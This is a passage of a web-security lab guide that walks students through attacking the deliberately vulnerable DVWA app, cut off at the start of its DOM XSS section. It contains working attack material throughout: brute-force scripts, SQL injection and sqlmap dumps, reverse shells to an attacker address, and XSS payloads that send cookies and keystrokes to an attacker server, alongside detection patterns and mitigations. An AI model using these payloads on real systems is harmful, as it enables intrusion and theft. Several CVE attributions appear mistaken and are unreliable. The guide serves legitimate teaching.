# Lab 10 — Web Application Security Field Guide
### DVWA Exploitation Reference | OWASP Top 10:2025

---

> **Companion lab.** This document is a technical reference to use *alongside* the DVWA instance provisioned in
> [Lab 5 — Web Exploitation with DVWA](../lab5/README.md). Start there to get the VM running, then return here
> as your exploitation manual.

---

## How to Use This Guide

DVWA exposes each vulnerability at three security levels: **Low**, **Medium**, and **High**.

| Level | What changes | Your job |
|---|---|---|
| **Low** | No input filtering, no protections | Understand the raw vulnerability |
| **Medium** | Partial mitigations (blacklists, weak checks) | Bypass the defense |
| **High** | Near-real-world defenses | Find the remaining gap (there always is one) |

Work through **Low first**. Read the source code (`View Source` button in DVWA). Understand *why* the payload works before moving to Medium. Security researchers who skip this step produce reports full of tool output and no understanding — don't be that person.

**Your attacker machine:** ParrotOS or Kali. All tools referenced are pre-installed.

---

## Vulnerability Index

| # | Vulnerability | OWASP 2025 | CWE | DVWA Module |
|---|---|---|---|---|
| 1 | [Brute Force](#1-brute-force) | A07 — Auth Failures | CWE-307 | Brute Force |
| 2 | [Weak Session IDs](#2-weak-session-ids) | A07 — Auth Failures | CWE-330 | Weak Session IDs |
| 3 | [SQL Injection](#3-sql-injection) | A03 — Injection | CWE-89 | SQL Injection |
| 4 | [SQL Injection (Blind)](#4-sql-injection-blind) | A03 — Injection | CWE-89 | SQLi Blind |
| 5 | [Command Injection](#5-command-injection) | A03 — Injection | CWE-78 | Command Injection |
| 6 | [Reflected XSS](#6-reflected-xss) | A03 — Injection | CWE-79 | XSS (Reflected) |
| 7 | [Stored XSS](#7-stored-xss) | A03 — Injection | CWE-79 | XSS (Stored) |
| 8 | [DOM-Based XSS](#8-dom-based-xss) | A03 — Injection | CWE-79 | XSS (DOM) |
| 9 | [CSRF](#9-csrf) | A01 — Broken Access Control | CWE-352 | CSRF |
| 10 | [File Inclusion](#10-file-inclusion) | A05 — Misconfiguration | CWE-98 | File Inclusion |
| 11 | [File Upload](#11-file-upload) | A04 — Insecure Design | CWE-434 | File Upload |
| 12 | [Insecure CAPTCHA](#12-insecure-captcha) | A07 — Auth Failures | CWE-804 | Insecure CAPTCHA |

---

## Environment Setup

```bash
# DVWA is running from Lab 5 — make sure it's up
cd ../lab5
vagrant up

# DVWA is reachable at:
#   http://localhost:8080     (from your host)
#   http://192.168.56.20      (from your attacker VM — adjust IP per your Lab 5 config)

# Default credentials
#   Username: admin   Password: password

# Set security level in DVWA
#   DVWA Security tab → set level → submit
# Or directly via cookie:
curl -c cookies.txt -d "username=admin&password=password&Login=Login" \
  http://localhost:8080/login.php
curl -b cookies.txt -d "security=low&seclev_submit=Submit" \
  http://localhost:8080/security.php
```

---

---

# 1. Brute Force

**OWASP A07:2025** — Identification and Authentication Failures
**CWE-307** — Improper Restriction of Excessive Authentication Attempts
**Real-world CVE:** CVE-2019-11447 (CuteNews), CVE-2022-26134 (Confluence) — both exploitable post-auth-brute

---

### Theory

Brute force attacks systematically try username/password combinations until one succeeds. Modern attacks are smarter than naive dictionary attacks:

- **Credential stuffing** — using leaked username:password pairs from data breaches (Collection #1, RockYou2024)
- **Password spraying** — one common password tried against many accounts (avoids lockout)
- **Targeted dictionary attack** — wordlists built from target-specific context (OSINT: pet names, birthdays, company name)

A login form with no rate-limiting, no lockout policy, and no CAPTCHA is a wide-open door.

### Why DVWA Is Vulnerable

```php
// DVWA Low — brute_force/source/low.php (simplified)
$user = $_GET['username'];
$pass = md5($_GET['password']);
$query = "SELECT * FROM users WHERE user = '$user' AND password = '$pass';";
// No rate limiting. No lockout. No CAPTCHA. Every request is processed.
```

### Attack Methodology

| Step | Goal | Tool |
|---|---|---|
| 1. Capture a login request | Get exact parameter names | Burp Suite Proxy |
| 2. Identify wordlist | Choose credential list | `rockyou.txt`, `SecLists` |
| 3. Launch attack | Iterate credentials | `hydra` or Burp Intruder |
| 4. Identify success | Detect valid credential response | Response length / status code difference |

### DVWA Walkthrough

**Level: LOW — No protections**

```bash
# Hydra HTTP GET form attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  "localhost" http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<your_session>;security=low"

# -l admin     : single username
# -P            : password wordlist
# H=Cookie      : pass your session cookie so DVWA accepts the request
# Last field    : failure string — hydra marks this as a failed attempt

# Result: admin:password (the default)
```

**Burp Suite Intruder method:**
1. Intercept a login POST → send to Intruder
2. Set attack type: **Cluster Bomb** (test both username and password simultaneously)
3. Payload set 1 (username): `admin`, `administrator`, `user`
4. Payload set 2 (password): load `rockyou.txt`
5. Start attack → sort by **Response Length** — different length = success

**Level: MEDIUM — `sleep(2)` added**

Same hydra command. The sleep only slows you down; it doesn't stop you. Add `-t 4` to reduce threads and be patient.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 \
  "localhost" http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<your_session>;security=medium"
```

**Level: HIGH — Anti-CSRF token per request**

DVWA injects a unique `user_token` into each login page. Hydra can't handle this out of the box. Use Burp Intruder with a **Macro** that fetches a fresh token before each request, or script it with Python:

```python
import requests
from bs4 import BeautifulSoup

target = "http://localhost:8080/dvwa/vulnerabilities/brute/"
session = requests.Session()

# Get a valid session first
session.post("http://localhost:8080/dvwa/login.php",
             data={"username": "admin", "password": "password", "Login": "Login"})
session.get("http://localhost:8080/dvwa/security.php",
            data={"security": "high", "seclev_submit": "Submit"})

passwords = open("/usr/share/wordlists/rockyou.txt", encoding="latin-1").readlines()

for pwd in passwords:
    pwd = pwd.strip()
    # Fetch fresh token from the page
    r = session.get(target)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    r = session.get(target, params={
        "username": "admin",
        "password": pwd,
        "Login": "Login",
        "user_token": token
    })
    if "Welcome" in r.text:
        print(f"[+] Found: admin:{pwd}")
        break
```

### Purple Team

**Detection signals:**
- Many failed login attempts from same IP within short window (`grep "login.php" access.log | awk '{print $1}' | sort | uniq -c | sort -rn`)
- User-agent strings from hydra/burp (`python-requests`, `Java/`, `Hydra`)
- Rapid sequence of requests with no time between them (bot-like timing)

**Mitigation:**
- Account lockout after N failures (with unlock-by-email, not just time)
- Rate limiting per IP and per account
- CAPTCHA on repeated failures
- Multi-factor authentication
- `fail2ban` + nginx/Apache rate limiting

### References

1. OWASP — Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
2. OWASP — Credential Stuffing Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html
3. PortSwigger Web Security Academy — Password-based Vulnerabilities: https://portswigger.net/web-security/authentication/password-based

---

---

# 2. Weak Session IDs

**OWASP A07:2025** — Identification and Authentication Failures
**CWE-330** — Use of Insufficiently Random Values
**Real-world CVE:** CVE-2021-41773 (Apache path traversal chained with session prediction)

---

### Theory

Session IDs are the keys to a user's authenticated session. If an application generates predictable session IDs (sequential integers, timestamps, MD5 of username+time), an attacker can:

1. **Predict** the next session ID and hijack a session before the legitimate user uses it
2. **Enumerate** existing sessions and attempt to match one to a privileged user
3. **Brute force** a small session ID space (e.g., 6-digit numeric)

This is identity theft without a password.

### Why DVWA Is Vulnerable

```php
// DVWA Low — weak_id/source/low.php (simplified)
if (!isset($_SESSION['last_session_id'])) {
    $_SESSION['last_session_id'] = 0;
}
$_SESSION['last_session_id']++;
$cookie_value = $_SESSION['last_session_id'];  // Sequential integer: 1, 2, 3...
setcookie("dvwaSession", $cookie_value);
// An attacker who gets ID=42 knows IDs 1-41 also exist.
```

### Attack Methodology

| Step | Goal | Tool |
|---|---|---|
| 1. Observe your own session ID | Understand the pattern | Browser DevTools / Burp |
| 2. Analyze entropy | Identify the generation algorithm | Manual analysis / Burp Sequencer |
| 3. Predict/enumerate | Generate candidate IDs | Custom script |
| 4. Test candidates | Find active privileged sessions | curl loop |

### DVWA Walkthrough

**Level: LOW — Sequential integer**

```bash
# Get your current session ID
curl -v -b "PHPSESSID=<your_session>;security=low" \
  http://localhost:8080/dvwa/vulnerabilities/weak_id/ 2>&1 | grep "dvwaSession"
# Output: Set-Cookie: dvwaSession=5  ← you're session 5
# Conclusion: sessions 1-4 exist. Try them:
for i in $(seq 1 100); do
  resp=$(curl -s -b "PHPSESSID=<your_session>;dvwaSession=$i;security=low" \
    http://localhost:8080/dvwa/vulnerabilities/weak_id/)
  echo "Session $i: $(echo $resp | grep -o 'user.*' | head -1)"
done
```

**Level: MEDIUM — MD5 of current timestamp (seconds)**

```bash
# The ID is MD5(unix_timestamp). The window is narrow.
# Generate all possible IDs for the last 60 seconds:
python3 -c "
import hashlib, time
now = int(time.time())
for ts in range(now - 60, now + 1):
    print(hashlib.md5(str(ts).encode()).hexdigest())
" > candidate_ids.txt

# Test each candidate:
while read id; do
  curl -s -b "PHPSESSID=<your_session>;dvwaSession=$id;security=medium" \
    http://localhost:8080/dvwa/vulnerabilities/weak_id/ | grep -q "Welcome" && echo "HIT: $id"
done < candidate_ids.txt
```

**Level: HIGH — Burp Sequencer analysis**

Even "random" session IDs can have statistical bias. Use **Burp Sequencer**:
1. Intercept a response that sets a cookie
2. Right-click → Send to Sequencer
3. Configure the token location (the cookie value)
4. Click "Start live capture" — collect 10,000+ tokens
5. Click "Analyze now" — FIPS test, NIST test, character-level analysis
6. Report the entropy bits per character

High-quality sessions should show **>100 bits of effective entropy**.

### Purple Team

**Detection:** Unusual pattern of session ID attempts; multiple requests with incrementing session cookie values from the same IP.

**Mitigation:**
- Use the framework's session manager (e.g., `express-session` with `genid: uuid.v4()`)
- Session IDs must be ≥128 bits from a CSPRNG (`/dev/urandom`, `crypto.randomBytes()`)
- Short session expiration for privileged actions
- Bind sessions to IP/User-Agent (with care for mobile users)
- Regenerate session ID after privilege escalation (login, role change)

### References

1. OWASP — Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
2. OWASP Testing Guide — OTG-SESS-001 (Session ID Analysis): https://owasp.org/www-project-web-security-testing-guide/
3. PortSwigger — Burp Sequencer Documentation: https://portswigger.net/burp/documentation/desktop/tools/sequencer

---

---

# 3. SQL Injection

**OWASP A03:2025** — Injection
**CWE-89** — Improper Neutralization of Special Elements in SQL Commands
**Real-world CVEs:** CVE-2012-2122 (MySQL auth bypass), CVE-2019-2725 (Oracle WebLogic), CVE-2021-44228 (Log4Shell used SQLi as initial vector in some chains)

---

### Theory

SQL Injection occurs when user-controlled input is concatenated directly into a SQL query. The database cannot distinguish between the developer's intended SQL structure and the attacker's injected commands. The impact ranges from authentication bypass to full database exfiltration to OS-level command execution (`xp_cmdshell` on MSSQL, `LOAD_FILE`/`INTO OUTFILE` on MySQL).

**Injection categories:**
| Type | How you get data back | Used when |
|---|---|---|
| Classic (UNION) | Data returned directly in page | SELECT results displayed |
| Error-based | Data encoded in error messages | Verbose errors enabled |
| Boolean-based blind | True/False page changes | No data returned, but behavior changes |
| Time-based blind | Sleep delays confirm true/false | No visible output at all |
| Out-of-band | DNS/HTTP requests carry data | Exotic; when above fail |

### Why DVWA Is Vulnerable

```php
// DVWA Low — sqli/source/low.php (simplified)
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
// $id is inserted raw. Input: ' OR '1'='1
// Resulting query: WHERE user_id = '' OR '1'='1'  ← always true, dumps all users
```

### Attack Methodology

```
Test input → Confirm injection → Determine column count → 
Extract database/table/column names → Extract target data
```

### DVWA Walkthrough

**Level: LOW — No filtering**

```bash
# Step 1: Confirm injection — does a single quote break the query?
# Input in the "User ID" field: '
# Expected: SQL error in the page

# Step 2: Determine number of columns with ORDER BY
# Input: 1 ORDER BY 1--         (works)
# Input: 1 ORDER BY 2--         (works → at least 2 columns)
# Input: 1 ORDER BY 3--         (error → exactly 2 columns)

# Step 3: Find which columns are displayed (string columns)
# Input: ' UNION SELECT NULL,NULL--
# Input: ' UNION SELECT 'a','b'--    (both show? both are string columns)

# Step 4: Extract database metadata
# Input: ' UNION SELECT user(),database()--
# Shows: current DB user + database name

# Step 5: Extract table names
# Input: ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

# Step 6: Extract column names from 'users' table
# Input: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Step 7: Extract credentials
# Input: ' UNION SELECT user,password FROM users--
# Results: admin | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of 'password')

# Crack the hash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | john --stdin --format=raw-md5
# or:
hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt
```

**Using sqlmap (automate the above):**

```bash
# First, get your session cookie from the browser (F12 → Application → Cookies)
sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session>;security=low" \
  --dbs                              # enumerate databases

sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session>;security=low" \
  -D dvwa --tables                   # enumerate tables in dvwa DB

sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session>;security=low" \
  -D dvwa -T users --dump            # dump users table (cracks hashes automatically)
```

**Level: MEDIUM — `mysql_real_escape_string()` on GET, but POST used — and it's a dropdown**

The input is now a POST dropdown. The source uses `mysql_real_escape_string()` but the ID is numeric — bypass by intercepting with Burp and modifying the POST body:

```bash
# Intercept with Burp → change id=1 to id=1 UNION SELECT user,password FROM users--
# No quotes needed — it's a numeric context, escaping doesn't help
curl -s -b "PHPSESSID=<session>;security=medium" \
  --data "id=1 UNION SELECT user,password FROM users--&Submit=Submit" \
  http://localhost:8080/dvwa/vulnerabilities/sqli/
```

**Level: HIGH — Session-stored ID, PDO with parameterized queries... but check the `LIMIT 1`**

```bash
# DVWA High uses a separate input page. The query is parameterized but
# check if there is a second injection point. Input in the cookie-based form:
# 1' UNION SELECT user,password FROM users LIMIT 1,1--
# The trick: bypass LIMIT 1 by adding your own LIMIT clause before the comment
```

### Purple Team

**Detection:**
```bash
# Common SQLi strings in web logs:
grep -iE "(union|select|information_schema|sleep\(|benchmark|0x|--|%27|%3b)" /var/log/apache2/access.log
```

**Mitigation:**
- **Parameterized queries / prepared statements** — the only real fix
- ORMs with proper escaping (SQLAlchemy, Eloquent, Hibernate)
- WAF (ModSecurity with OWASP CRS) as defense-in-depth
- Principle of least privilege on DB accounts (no `DROP`, `FILE`, `SUPER`)
- Error messages must not expose query structure to users

### References

1. OWASP — SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
2. PortSwigger — SQL Injection: https://portswigger.net/web-security/sql-injection
3. OWASP Testing Guide — WSTG-INPV-05: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection

---

---

# 4. SQL Injection (Blind)

**OWASP A03:2025** — Injection
**CWE-89**
**Real-world CVE:** CVE-2020-1147 (.NET SharePoint blind SQLi), CVE-2023-23397 (Outlook — SSRF + blind SQLi chain)

---

### Theory

Blind SQLi is the same vulnerability as classic SQLi, but the database does not return data in the page. Instead, you infer information bit by bit:

- **Boolean-based:** The page looks slightly different when your condition is TRUE vs FALSE. You ask the database yes/no questions and read the answer from the page.
- **Time-based:** You inject `SLEEP(N)` — if the page takes N seconds longer to respond, your condition was TRUE.

Blind SQLi requires more requests but is equally dangerous. Automated tools like `sqlmap` were built specifically for this.

### DVWA Walkthrough

**Level: LOW — Boolean-based blind**

The page only says "User ID exists" or "User ID is MISSING."

```bash
# Confirm blind injection:
# TRUE condition:  1' AND 1=1--   → "User ID exists"
# FALSE condition: 1' AND 1=2--   → "User ID is MISSING"
# That difference proves injection.

# Extract database name character by character:
# Is the first char of database() > 'a'? (ASCII 97)
# Input: 1' AND (SELECT SUBSTRING(database(),1,1)) > 'a'--   → TRUE
# Input: 1' AND (SELECT SUBSTRING(database(),1,1)) > 'n'--   → ? keep bisecting

# Binary search approach (much faster than linear):
# Mid of 'a'(97) and 'z'(122) is 'o'(109)
# 1' AND ASCII(SUBSTRING(database(),1,1)) > 109--  → FALSE
# → character is <= 109
# Continue bisecting... eventually: 'd' → database name starts with 'd' (dvwa)

# sqlmap handles this automatically:
sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>;security=low" \
  --technique=B \                    # Boolean-based only
  -D dvwa -T users --dump
```

**Level: MEDIUM — Time-based blind**

```bash
# Boolean differences are neutralized. Use SLEEP():
# TRUE:  1 AND SLEEP(3)--           → page takes ~3 extra seconds
# FALSE: 1 AND 1=2 AND SLEEP(3)--   → page responds immediately

sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>;security=medium" \
  --data="id=1&Submit=Submit" \
  --technique=T \                    # Time-based only
  --time-sec=3 \
  -D dvwa -T users --dump
```

**Manual time-based extraction (one character at a time):**

```bash
# Is first char of user() ASCII value = 114 (r) ?
# 1 AND IF(ASCII(SUBSTRING(user(),1,1))=114, SLEEP(3), 0)--
# Measure response time. If ~3s: yes. If <1s: no.

# Script it:
python3 -c "
import requests, time

url = 'http://localhost:8080/dvwa/vulnerabilities/sqli_blind/'
cookies = {'PHPSESSID': '<session>', 'security': 'low'}
charset = 'abcdefghijklmnopqrstuvwxyz0123456789_@.ABCDEFGHIJKLMNOPQRSTUVWXYZ'
result = ''
for pos in range(1, 20):
    for char in charset:
        payload = f\"1' AND IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(2),0)-- \"
        start = time.time()
        requests.get(url, params={'id': payload, 'Submit': 'Submit'}, cookies=cookies)
        elapsed = time.time() - start
        if elapsed > 1.8:
            result += char
            print(f'Position {pos}: {char} → current: {result}')
            break
    else:
        break
print(f'Database: {result}')
"
```

### Purple Team

**Detection:** Anomalous response time variance in logs; requests with SQL keywords in parameters; automated tool fingerprints in User-Agent.

**Mitigation:** Same as classic SQLi — parameterized queries. Time-based blind is **only possible** if the injection point exists.

### References

1. OWASP — Blind SQL Injection: https://owasp.org/www-community/attacks/Blind_SQL_Injection
2. PortSwigger — Blind SQLi: https://portswigger.net/web-security/sql-injection/blind
3. sqlmap Documentation — Techniques: https://sqlmap.org/

---

---

# 5. Command Injection

**OWASP A03:2025** — Injection
**CWE-78** — Improper Neutralization of Special Elements in OS Commands
**Real-world CVEs:** CVE-2021-42013 (Apache path traversal → RCE), CVE-2022-1388 (F5 BIG-IP RCE), CVE-2023-44487 chains with command injection

---

### Theory

When a web application passes user input to an OS shell command without sanitization, the attacker can inject additional shell commands. Unlike SQLi (which targets the database), command injection gives you **direct OS-level access** — read files, create backdoors, pivot to internal network.

**Shell metacharacters that separate/chain commands:**

| Character | Effect |
|---|---|
| `;` | Run second command regardless |
| `&&` | Run second command if first succeeds |
| `\|\|` | Run second command if first fails |
| `\|` | Pipe first command output into second |
| `$(cmd)` | Command substitution |
| `` `cmd` `` | Command substitution (backtick) |

### Why DVWA Is Vulnerable

```php
// DVWA Low — exec/source/low.php
$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);
// Input: 127.0.0.1; cat /etc/passwd
// Executed: ping -c 4 127.0.0.1; cat /etc/passwd
// Both commands run. The /etc/passwd content appears in the page.
```

### DVWA Walkthrough

**Level: LOW — No filtering**

```bash
# Basic test — append a command after a valid IP:
# Input: 127.0.0.1; id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Read sensitive files:
# Input: 127.0.0.1; cat /etc/passwd
# Input: 127.0.0.1; cat /etc/shadow    (may fail — need root)

# Environment variables (useful for fingerprinting):
# Input: 127.0.0.1; env

# Reverse shell — catch it with netcat on your attacker machine:
# On attacker: nc -lvnp 4444
# Input: 127.0.0.1; bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Alternative reverse shell (python):
# Input: 127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

**Level: MEDIUM — Strips `&&` and `;`**

```bash
# Bypass: use | or ||
# Input: 127.0.0.1 | id
# Input: 127.0.0.1 || id     (if ping fails, id runs)

# Bypass with substitution:
# Input: 127.0.0.1 | cat /etc/passwd
```

**Level: HIGH — Aggressive blacklist**

```bash
# Source strips: & ; | - $ ( ) ` || &&  and spaces
# Bypass: use ${IFS} as space substitute, use redirection tricks
# Input: 127.0.0.1|cat${IFS}/etc/passwd
# Input: 127.0.0.1|id
# Note: High uses str_replace with array of chars but misses | alone
# Read source carefully — the bypass is in what's NOT on the blacklist
```

**Upgrade to interactive shell after reverse shell:**

```bash
# Once you have the basic reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (background nc)
stty raw -echo; fg
export TERM=xterm
# Now you have a fully interactive terminal
```

### Purple Team

**Detection:**
```bash
# Monitor for shell metacharacters in web server logs:
grep -E "(%7C|%3B|%26|%60|\|\||&&|;|`|\$\()" /var/log/apache2/access.log
# Monitor process tree — web server spawning shells:
# auditd rule: -a exit,always -F arch=b64 -S execve -F ppid=<apache_pid>
```

**Mitigation:**
- **Never pass user input to shell functions** (`exec()`, `system()`, `shell_exec()`, `popen()`, `subprocess.call(shell=True)`)
- Use language-native alternatives: PHP's `file_get_contents()` instead of `shell_exec('cat ...')`
- If shell execution is unavoidable: use `escapeshellarg()` / `escapeshellcmd()` AND a strict whitelist
- Run the web application as a low-privilege user (not root, not www-data with sudo)
- AppArmor / SELinux profiles to restrict what the web process can execute

### References

1. OWASP — OS Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
2. OWASP — Testing for Command Injection (WSTG-INPV-12): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
3. PortSwigger — OS Command Injection: https://portswigger.net/web-security/os-command-injection

---

---

# 6. Reflected XSS

**OWASP A03:2025** — Injection
**CWE-79** — Improper Neutralization of Input During Web Page Generation
**Real-world CVEs:** CVE-2020-11022 (jQuery XSS), CVE-2021-26084 (Confluence XSS), CVE-2022-3590 (WordPress reflected XSS)

---

### Theory

Cross-Site Scripting (XSS) injects client-side scripts into web pages viewed by other users. In **reflected XSS**, the payload is in the URL or request — the server reflects it back immediately in the response. The attack requires tricking the victim into clicking a malicious link.

**What you can do with XSS:**
- Steal session cookies (`document.cookie`) → account hijacking
- Keylog form inputs → credential theft
- Redirect to phishing page
- Perform actions as the victim (CSRF via XSS)
- Browser exploitation (BeEF framework)

### Why DVWA Is Vulnerable

```php
// DVWA Low — xss_r/source/low.php
$name = $_GET['name'];
echo "<pre>Hello " . $name . "</pre>";
// Input: <script>alert('XSS')</script>
// Output: <pre>Hello <script>alert('XSS')</script></pre>
// Browser executes the script.
```

### DVWA Walkthrough

**Level: LOW — No filtering**

```bash
# Basic proof-of-concept: confirm script execution
# Input in "What's your name?" field:
<script>alert('XSS')</script>

# Cookie theft payload:
<script>document.location='http://<attacker_ip>:8000/?c='+document.cookie</script>
# On attacker: python3 -m http.server 8000
# Victim clicks the URL — their cookie appears in your server log

# Weaponized URL (send to victim):
http://localhost:8080/dvwa/vulnerabilities/xss_r/?name=<script>document.location='http://<attacker_ip>:8000/?c='+document.cookie</script>

# BeEF hook (browser exploitation framework — pre-installed on Kali/Parrot):
# Start BeEF: beef-xss
# Hook payload:
<script src="http://<attacker_ip>:3000/hook.js"></script>
# Once victim loads the URL, their browser appears in BeEF dashboard
```

**Level: MEDIUM — Strips `<script>` tags**

```bash
# Bypass: case variations
<Script>alert(1)</Script>
<SCRIPT>alert(1)</SCRIPT>

# Event-handler bypass (no <script> tag needed):
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>

# Cookie theft without <script>:
<img src=x onerror="document.location='http://<attacker_ip>:8000/?c='+document.cookie">
```

**Level: HIGH — Uses `htmlspecialchars()` (proper fix)**

The bypass here is to look for **other input vectors** on the page — different parameters, HTTP headers reflected in the page (User-Agent, Referer). Use Burp to test:

```bash
# Try HTTP headers that may be reflected:
curl -H "User-Agent: <script>alert(1)</script>" \
  "http://localhost:8080/dvwa/vulnerabilities/xss_r/" \
  -b "PHPSESSID=<session>;security=high"

# Check if Referer is reflected:
curl -H "Referer: <script>alert(1)</script>" \
  "http://localhost:8080/dvwa/vulnerabilities/xss_r/" \
  -b "PHPSESSID=<session>;security=high"
```

**URL-encoding the payload (for delivery via URL):**

```bash
# Raw payload:  <script>alert(document.cookie)</script>
# URL-encoded:  %3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(document.cookie)</script>'))"
```

### Purple Team

**Detection:**
```bash
# XSS attempts in logs:
grep -iE "(<script|onerror=|onload=|javascript:|%3Cscript)" /var/log/apache2/access.log
```

**Mitigation:**
- **Output encoding** — the only real fix: `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')`
- Context-aware encoding: HTML encoding for HTML context, JS encoding for JS context
- Content-Security-Policy header: `Content-Security-Policy: script-src 'self'` — blocks inline scripts
- `HttpOnly` cookie flag — prevents `document.cookie` access
- `X-XSS-Protection: 1; mode=block` (legacy browsers)

### References

1. OWASP — XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
2. OWASP — Testing for Reflected XSS (WSTG-INPV-01): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
3. PortSwigger — Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/reflected

---

---

# 7. Stored XSS

**OWASP A03:2025** — Injection
**CWE-79**
**Real-world CVEs:** CVE-2021-27065 (Exchange Server stored XSS → RCE chain), CVE-2022-26134 (Confluence stored XSS)
**Historical:** The **Samy Worm** (MySpace, 2005) — spread to 1 million users in 20 hours via stored XSS (see Lab 5)

---

### Theory

Stored XSS (also called **persistent XSS**) differs from reflected XSS in one critical way: the payload is **saved in the database** and **automatically executes for every user** who views the affected page. No malicious link required — just visit the page.

This makes stored XSS **significantly more dangerous** than reflected XSS:
- A comment on a popular page = hits every reader
- An admin panel note = targets privileged users
- A user profile field = triggers on every profile view
- A log viewer = turns log injection into admin compromise

### Why DVWA Is Vulnerable

```php
// DVWA Low — xss_s/source/low.php (simplified)
$message = stripslashes($_POST['mtxMessage']);
$name    = stripslashes($_POST['txtName']);
// Both are inserted directly into the DB, then rendered without escaping.
// Every visitor who loads the page executes your script.
```

### DVWA Walkthrough

**Level: LOW — No filtering**

```bash
# Basic PoC — submit in the "Message" field:
<script>alert('Stored XSS — everyone who loads this page sees this')</script>

# Session hijacking — every visitor's cookie sent to you:
<script>new Image().src='http://<attacker_ip>:8000/?c='+document.cookie</script>
# On attacker: python3 -m http.server 8000
# Every visitor's session cookie arrives at your server

# Keylogger — capture everything typed on the page:
<script>
document.onkeypress=function(e){
  new Image().src='http://<attacker_ip>:8000/?k='+String.fromCharCode(e.which);
}
</script>

# BeEF hook (persistent — every visitor gets hooked):
<script src="http://<attacker_ip>:3000/hook.js"></script>
```

**Level: MEDIUM — `<script>` stripped (case-insensitive)**

```bash
# Event handler bypass:
<img src=x onerror=alert(1)>

# SVG vector:
<svg/onload=alert(1)>

# Split payload (sometimes bypasses filters):
<sc<script>ript>alert(1)</sc</script>ript>

# Max-length bypass: the "Name" field has maxlength=10 in HTML.
# Bypass by removing the attribute in DevTools (F12 → edit the HTML),
# or intercept with Burp and submit a longer name.
```

**Level: HIGH — `htmlspecialchars()` on message, but check the Name field**

Read the source carefully. In some DVWA versions, `htmlspecialchars()` is applied to `$message` but `$name` still uses `addslashes()`. Test the Name field:

```bash
# Intercept with Burp — change txtName to:
<img src=x onerror=alert(document.cookie)>
# If the Name appears anywhere without proper encoding → stored XSS in the name
```

**Escalation: Admin session hijack scenario**

```
1. Attacker submits stored XSS payload in guestbook/comments
2. Admin logs in to review messages → page loads → payload executes
3. Admin's session cookie sent to attacker's server
4. Attacker uses admin cookie → full admin access

This is exactly the Samy Worm attack vector.
```

### Purple Team

**Detection:** Input validation alerts on save (WAF); CSP violation reports; unusual outbound requests from user browsers (requires CSP reporting).

**Mitigation:**
- Encode on **output**, not on input — input sanitization can corrupt data
- Separate storage from display: store raw, encode when rendering
- CSP blocks exfiltration even if XSS fires: `Content-Security-Policy: default-src 'self'; connect-src 'self'`
- Use a trusted sanitization library for rich-text fields (DOMPurify for HTML, OWASP Java HTML Sanitizer)

### References

1. OWASP — Stored XSS: https://owasp.org/www-community/attacks/xss/#stored-xss-attacks
2. PortSwigger — Stored XSS: https://portswigger.net/web-security/cross-site-scripting/stored
3. OWASP — DOM-based XSS Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

---

---

# 8. DOM-Based XSS

**OWASP A03:2025** — Injection
**CWE-79**
**Real-world CVE:** CVE-2020-11022/11023 (jQuery DOM XSS), CVE-2021-44228 (Log4Shell payload delivery via DOM sink)

---

### Theory

